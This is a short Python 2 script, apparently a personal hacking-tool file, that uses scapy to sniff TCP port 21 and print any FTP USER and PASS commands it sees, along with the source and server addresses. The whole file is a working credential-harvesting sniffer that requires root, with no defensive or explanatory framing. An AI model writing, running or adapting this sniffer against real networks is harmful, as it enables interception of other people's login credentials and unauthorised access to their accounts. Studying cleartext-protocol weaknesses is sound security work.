#!/usr/bin/env python
# -----------------------------------------------------------
# Filename      : ftpSneef.py
# Description   :
# Created By    : Joe Pistone
# Date Created  : 28-Nov-2015 18:57
# Date Modified :
#
# License       : Development
#
# Description   : Sniff packets for credentials on port 21
#
# (c) Copyright 2015, TheKillingTime all rights reserved.
#-----------------------------------------------------------

__author__  = "Joe Pistone"
__version__ = "0.1"


import os
from scapy.all import *


def packetCallBack(packet):
    '''scans the payload of the TCP packet for
       ftp traffic for usernames and passwords.
    '''
    effteepea_packet = str(packet[TCP].payload)
    if "USER" in effteepea_packet or "PASS" in effteepea_packet:
        print "--" * 25
        print "\n[=>] Server: %s" % packet[IP].dst
        print "[=>] Source: %s" % packet[IP].src
        print "[=>] %s" % packet[TCP].payload
        print "--" * 25

if __name__ == '__main__':
    try:
        if os.getuid() == 0:
            print "[*] Sniffing traffic on port 21 for credentials....\n"
            sniff(filter='tcp port 21', prn=packetCallBack, store=0)
        else:
            print "[!] Please run this script as root."
    except Exception, e:
        print '[!] Error! %s' % e
